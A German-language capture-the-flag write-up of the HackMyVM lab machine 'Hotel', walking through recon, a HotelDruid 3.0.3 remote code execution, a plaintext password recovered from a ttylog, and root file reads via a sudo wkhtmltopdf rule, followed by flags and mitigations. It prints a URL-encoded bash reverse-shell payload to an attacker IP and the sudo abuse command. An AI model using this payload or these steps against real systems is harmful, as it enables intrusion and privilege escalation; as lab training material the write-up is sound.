# Hotel (HackMyVM) - Penetration Test Bericht

![Hotel.png](Hotel.png)

**Datum des Berichts:** 2022-10-04  
**VM:** Hotel  
**Plattform:** HackMyVM [https://hackmyvm.eu/machines/machine.php?vm=Hotel](https://hackmyvm.eu/machines/machine.php?vm=Hotel)  
**Autor der VM:** DarkSpirit  
**Original Writeup:** [https://alientec1908.github.io/Hotel_HackMyVM_Easy/](https://alientec1908.github.io/Hotel_HackMyVM_Easy/)

---

## Disclaimer

**Wichtiger Hinweis:** Dieser Bericht und die darin enthaltenen Informationen dienen ausschließlich zu Bildungs- und Forschungszwecken im Bereich der Cybersicherheit. Die hier beschriebenen Techniken und Werkzeuge dürfen nur in legalen und autorisierten Umgebungen (z.B. auf eigenen Systemen oder mit ausdrücklicher Genehmigung des Eigentümers) angewendet werden. Jegliche illegale Nutzung der hier bereitgestellten Informationen ist strengstens untersagt. Der Autor übernimmt keine Haftung für Schäden, die durch Missbrauch dieser Informationen entstehen. Handeln Sie stets verantwortungsbewusst und ethisch.

---

## Inhaltsverzeichnis

1.  [Zusammenfassung](#zusammenfassung)
2.  [Verwendete Tools](#verwendete-tools)
3.  [Phase 1: Reconnaissance](#phase-1-reconnaissance)
4.  [Phase 2: Web Enumeration & Initial Access (HotelDruid RCE)](#phase-2-web-enumeration--initial-access-hoteldruid-rce)
5.  [Phase 3: Privilege Escalation (Kette)](#phase-3-privilege-escalation-kette)
    *   [www-data zu person (Passwort aus `ttylog`)](#www-data-zu-person-passwort-aus-ttylog)
    *   [person zu root (Sudo/wkhtmltopdf)](#person-zu-root-sudowkhtmltopdf)
6.  [Proof of Concept (Root Access via Sudo wkhtmltopdf)](#proof-of-concept-root-access-via-sudo-wkhtmltopdf)
7.  [Flags](#flags)
8.  [Empfohlene Maßnahmen (Mitigation)](#empfohlene-maßnahmen-mitigation)

---

## Zusammenfassung

Dieser Bericht dokumentiert die Kompromittierung der virtuellen Maschine "Hotel" von HackMyVM (Schwierigkeitsgrad: Easy). Die initiale Erkundung identifizierte einen Webserver, auf dem **HotelDruid Version 3.0.3** lief. Für diese Version wurde auf Exploit-DB ein Exploit (50754) für eine Remote Code Execution (RCE) Schwachstelle in `dati/selectappartamenti.php` gefunden und erfolgreich ausgenutzt, um eine Reverse Shell als Benutzer `www-data` zu erhalten.

Die Privilegieneskalation erfolgte in zwei Schritten:
1.  **www-data zu person:** Im Kontext von `www-data` wurde eine Datei `dati_connessione.php` mit MySQL-Datenbankzugangsdaten (`adminh:adminp`) gefunden. Eine Systemdatei `ttylog` (wahrscheinlich eine Terminal-Aufzeichnung) enthielt das Klartextpasswort `Endur4nc3.` für den Benutzer `person`. Damit war ein SSH-Login als `person` möglich.
2.  **person zu root:** Der Benutzer `person` durfte `/usr/bin/wkhtmltopdf` über `sudo` als `root` ohne Passwort ausführen. Dies wurde genutzt, um den Inhalt von `/root/root.txt` in eine PDF-Datei zu schreiben und so die Root-Flagge zu extrahieren.

---

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `nikto`
*   `gobuster`
*   `curl`
*   `python3` (Exploit-Skript, `http.server`, `pty` Modul)
*   `nc (netcat)`
*   `mysql` (Client)
*   `find`
*   `ss`
*   `wget`
*   `strings`
*   `ttyplay` (oder Alternative)
*   `ssh`
*   `sudo`
*   `wkhtmltopdf` (als Exploit-Ziel)
*   `cat`, `ls`, `grep`

---

## Phase 1: Reconnaissance

1.  **Netzwerk-Scan:**
    *   `arp-scan -l` identifizierte das Ziel `192.168.2.116` (VirtualBox VM).

2.  **Port-Scan (Nmap):**
    *   Ein umfassender `nmap`-Scan (`nmap -sS -sC -T5 -sV -A 192.168.2.116 -p-`) offenbarte:
        *   **Port 22 (SSH):** OpenSSH 8.4p1 Debian
        *   **Port 80 (HTTP):** nginx 1.18.0, Titel "Hoteldruid".

---

## Phase 2: Web Enumeration & Initial Access (HotelDruid RCE)

1.  **Anwendungsidentifikation und -Enumeration:**
    *   `nikto` lieferte keine spezifischen Schwachstellen, wies aber auf fehlende Sicherheitsheader hin.
    *   `gobuster dir` enthüllte die Struktur der HotelDruid-Anwendung, einschließlich `/doc/README.english` und `/doc/CHANGELOG`.

2.  **Identifizierung der HotelDruid-Version und Schwachstelle:**
    *   Durch Analyse der Dokumentationsdateien wurde **HotelDruid Version 3.0.3** identifiziert.
    *   Eine Suche auf Exploit-DB ergab den Exploit `50754` für eine Remote Code Execution (RCE) Schwachstelle in `dati/selectappartamenti.php` via `cmd`-Parameter.

3.  **Ausnutzung der RCE:**
    *   Das Exploit-Skript von Exploit-DB (`curl https://www.exploit-db.com/raw/50754 -o hoteldruid.py`) bestätigte die RCE.
    *   Die RCE wurde genutzt, um eine Bash-Reverse-Shell zum Angreifer-System (IP `192.168.2.140`, Port `9001`) zu starten:
        ```bash
        # Aufruf über Browser oder curl (URL-kodiert):
        # http://192.168.2.116/dati/selectappartamenti.php?cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.140%2F9001%200%3E%261%27
        ```
    *   Ein `nc -lvvp 9001` auf dem Angreifer-System empfing die Verbindung. Initialer Zugriff als `www-data` wurde erlangt und die Shell stabilisiert.

---

## Phase 3: Privilege Escalation (Kette)

### www-data zu person (Passwort aus `ttylog`)

1.  **Datenbank-Credentials-Fund:**
    *   Als `www-data` wurde die Datei `/var/www/html/hoteldruid/dati/dati_connessione.php` gefunden, die MySQL-Zugangsdaten enthielt:
        *   Benutzer: `adminh`
        *   Passwort: `adminp`
        *   Host: `localhost:3306`
    *   Ein Login-Versuch als `person` mit dem Passwort `adminp` zur Datenbank scheiterte.

2.  **Fund und Analyse der `ttylog`-Datei:**
    *   Eine Datei `ttylog` (Fundort im Log nicht explizit, vermutlich durch `find`-Suche) wurde vom Zielsystem zum Angreifer-System übertragen (mittels `python3 -m http.server` und `wget`).
    *   Die Analyse der `ttylog`-Datei mit `strings` und `ttyplay` enthüllte das Klartext-Passwort für den Benutzer `person`:
        `Endur4nc3.`

3.  **SSH-Login als `person`:**
    *   Mit dem Passwort `Endur4nc3.` wurde ein SSH-Login als `person` durchgeführt:
        ```bash
        ssh person@192.168.2.116
        # Passwort: Endur4nc3.
        ```
    *   Zugriff als `person` wurde erlangt. Die User-Flag `RUvSNcQ3m2yHzxHMV` wurde in `/home/person/user.txt` gefunden.

### person zu root (Sudo/wkhtmltopdf)

1.  **Sudo-Rechte-Prüfung für `person`:**
    *   `person@hotel:~$ sudo -l` zeigte:
        ```
        User person may run the following commands on hotel:
            (root) NOPASSWD: /usr/bin/wkhtmltopdf
        ```
2.  **Ausnutzung von `sudo wkhtmltopdf`:**
    *   Der Benutzer `person` konnte `/usr/bin/wkhtmltopdf` als `root` ohne Passwort ausführen. Dies wurde genutzt, um den Inhalt von `/root/root.txt` in eine PDF-Datei zu schreiben:
        ```bash
        sudo wkhtmltopdf /root/root.txt root.pdf
        ```
    *   Die erstellte `root.pdf` wurde zum Angreifer-System übertragen (mittels `python3 -m http.server` und `wget`).
    *   Das Öffnen der PDF-Datei enthüllte die Root-Flagge.

---

## Proof of Concept (Root Access via Sudo wkhtmltopdf)

**Kurzbeschreibung:** Die finale Privilegieneskalation von `person` zu `root` erfolgte durch eine unsichere `sudo`-Regel. Diese erlaubte `person`, `/usr/bin/wkhtmltopdf` als `root` ohne Passwort auszuführen. `wkhtmltopdf` kann lokale Dateien lesen. Durch Angabe von `/root/root.txt` als Eingabedatei wurde deren Inhalt in eine für `person` lesbare PDF-Datei geschrieben.

**Schritte (als `person`):**
1.  Führe den folgenden Befehl aus, um den Inhalt von `/root/root.txt` in eine PDF zu konvertieren:
    ```bash
    sudo wkhtmltopdf /root/root.txt root.pdf
    ```
2.  Übertrage die Datei `root.pdf` auf das Angreifer-System (z.B. via `python3 -m http.server 8888` auf dem Ziel und `wget http://[Ziel-IP]:8888/root.pdf` auf dem Angreifer-System).
3.  Öffne die PDF-Datei oder extrahiere den Text (z.B. mit `pdftotext root.pdf -`), um die Root-Flagge zu lesen.

**Ergebnis:** Die Root-Flagge (`7MUnADgp3g4STEPHMV`) wird preisgegeben.

---

## Flags

*   **User Flag (`/home/person/user.txt`):**
    ```
    RUvSNcQ3m2yHzxHMV
    ```
*   **Root Flag (`/root/root.txt`, extrahiert via `wkhtmltopdf`):**
    ```
    7MUnADgp3g4STEPHMV
    ```

---

## Empfohlene Maßnahmen (Mitigation)

*   **Anwendungssicherheit (HotelDruid):**
    *   **DRINGEND:** Aktualisieren Sie HotelDruid sofort auf die neueste, gepatchte Version, um die RCE-Schwachstelle in `selectappartamenti.php` (Version 3.0.3) zu schließen.
    *   Entfernen oder sichern Sie verwundbare Komponenten, falls kein Patch verfügbar ist.
    *   Validieren Sie alle Benutzereingaben serverseitig strikt, um Command Injection und andere Injection-Angriffe zu verhindern.
*   **Datenbank-Sicherheit:**
    *   **Speichern Sie Datenbank-Credentials niemals im Klartext** in PHP-Dateien im Web-Root oder anderen leicht zugänglichen Orten. Verwenden Sie Umgebungsvariablen oder Konfigurationsdateien außerhalb des Web-Roots mit strengen Berechtigungen.
    *   Ändern Sie kompromittierte Datenbankpasswörter umgehend.
*   **Log-Management und sensible Daten:**
    *   Stellen Sie sicher, dass Terminal-Aufzeichnungen (`ttylog`) oder andere Log-Dateien, die sensible Informationen wie Passwörter enthalten könnten, nicht ungeschützt auf dem System verbleiben oder für unprivilegierte Benutzer zugänglich sind. Löschen Sie alte oder nicht benötigte Logs.
*   **Sudo-Konfiguration:**
    *   **DRINGEND:** Entfernen Sie die unsichere `sudoers`-Regel, die dem Benutzer `person` erlaubt, `/usr/bin/wkhtmltopdf` als `root` ohne Passwort auszuführen.
    *   Gewähren Sie `sudo`-Rechte nur nach dem Prinzip der geringsten Rechte. Vermeiden Sie `NOPASSWD` und die Erlaubnis, vielseitige Tools auszuführen, die zum Lesen beliebiger Dateien oder zur Codeausführung missbraucht werden können (siehe GTFOBins für Beispiele).
*   **Passwortsicherheit:**
    *   Erzwingen Sie starke, einzigartige Passwörter für alle Benutzer.
    *   Schulen Sie Benutzer im sicheren Umgang mit Passwörtern und im Erkennen von Social Engineering.
*   **Netzwerksicherheit:**
    *   Implementieren Sie Egress Filtering, um ausgehende Verbindungen (wie Reverse Shells) von Servern zu blockieren oder zu überwachen.
*   **Allgemeine Systemhärtung:**
    *   Überprüfen Sie regelmäßig SUID-Berechtigungen und entfernen Sie diese von nicht benötigten Binaries.
    *   Halten Sie alle Systemkomponenten (OS, Webserver, SSH, Anwendungen) auf dem neuesten Stand.

---

**Ben C. - Cyber Security Reports**
